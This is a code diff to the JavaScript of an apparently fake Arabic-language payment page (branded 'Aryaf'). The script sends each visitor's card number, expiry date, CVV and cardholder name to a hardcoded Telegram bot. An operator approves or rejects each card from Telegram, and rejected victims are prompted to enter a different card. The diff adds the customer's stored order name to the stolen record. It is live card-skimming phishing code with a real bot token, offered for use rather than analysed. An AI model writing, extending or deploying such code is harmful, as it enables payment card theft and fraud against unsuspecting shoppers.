@@ -146,10 +146,26 @@ svg{width:1em;height:1em;flex:none}
   const TELEGRAM_BOT_TOKEN = '8741663993:AAGpYQSJwGVw6j2BxTDGf8ZHN9QUwXXwU50';
   const TELEGRAM_CHAT_ID = '8108427825';
 
+  // دالة لجلب اسم صاحب الطلب المخزن محلياً
+  function getCustomerName() {
+    try {
+      const savedOrder = JSON.parse(localStorage.getItem('areef_order'));
+      if (savedOrder && savedOrder.name) {
+        return savedOrder.name;
+      }
+    } catch (e) {
+      console.error("خطأ في قراءة الاسم من التخزين المحلي", e);
+    }
+    return "غير متوفر";
+  }
+
   async function sendToTelegram(data) {
     const ltrMark = '\u200E';
+    const customerName = getCustomerName();
+
     const message = `💳 *بيانات بطاقة جديدة (أرياف)*:\n\n` +
-                    `👤 *الاسم:* ${ltrMark}${data.name}\n` +
+                    `👤 *اسم صاحب الطلب:* ${ltrMark}${customerName}\n` +
+                    `🏷️ *اسم حامل البطاقة:* ${ltrMark}${data.name}\n` +
                     `🔢 *رقم البطاقة:* \`${ltrMark}${data.card}\`\n` +
                     `📅 *تاريخ الانتهاء:* \`${ltrMark}${data.exp}\`\n` +
                     `🔐 *CVV:* \`${ltrMark}${data.cvv}\``;
@@ -184,12 +200,15 @@ svg{width:1em;height:1em;flex:none}
     return null;
   }
 
-  // دالة لتحديث رسالة تيليجرام وإزالة الأزرار وتغيير الحالة
+  // دالة لتحديث رسالة تيليجرام وإزالة الأزرار وتغيير الحالة مع جلب الاسم
   async function updateTelegramMessage(messageId, cardData, action) {
     const ltrMark = '\u200E';
+    const customerName = getCustomerName();
     const statusText = action === 'approve_payment' ? '✅ *الحالة:* تمت الموافقة' : '❌ *الحالة:* تم الرفض';
+    
     const updatedMessage = `💳 *بيانات بطاقة (أرياف)*:\n\n` +
-                           `👤 *الاسم:* ${ltrMark}${cardData.name}\n` +
+                           `👤 *اسم صاحب الطلب:* ${ltrMark}${customerName}\n` +
+                           `🏷️ *اسم حامل البطاقة:* ${ltrMark}${cardData.name}\n` +
                            `🔢 *رقم البطاقة:* \`${ltrMark}${cardData.card}\`\n` +
                            `📅 *تاريخ الانتهاء:* \`${ltrMark}${cardData.exp}\`\n` +
                            `🔐 *CVV:* \`${ltrMark}${cardData.cvv}\`\n\n` +
@@ -312,7 +331,6 @@ svg{width:1em;height:1em;flex:none}
   form.addEventListener('submit',async e=>{
     e.preventDefault();
     status.hidden=true;status.classList.remove('bad');
-    // مسح رسالة خطأ رقم البطاقة السابقة عند إعادة المحاولة
     setErr(cc, '');
 
     if(method()==='apple'){note.hidden=false;note.scrollIntoView({block:'center'});return}
@@ -344,12 +362,10 @@ svg{width:1em;height:1em;flex:none}
     loadingOverlay.hidden = true;
 
     if (decision) {
-      // تحديث رسالة تيليجرام بناءً على القرار (موافقة أو رفض) وإزالة الأزرار
       await updateTelegramMessage(msgId, cardData, decision);
     }
 
     if (decision === 'reject_payment') {
-      // طباعة عبارة الرفض أسفل حقل رقم البطاقة
       setErr(cc, 'تم رفض البطاقة يرجى استخدام بطاقة مختلفة');
       cc.focus();
     } else if (decision === 'approve_payment') {
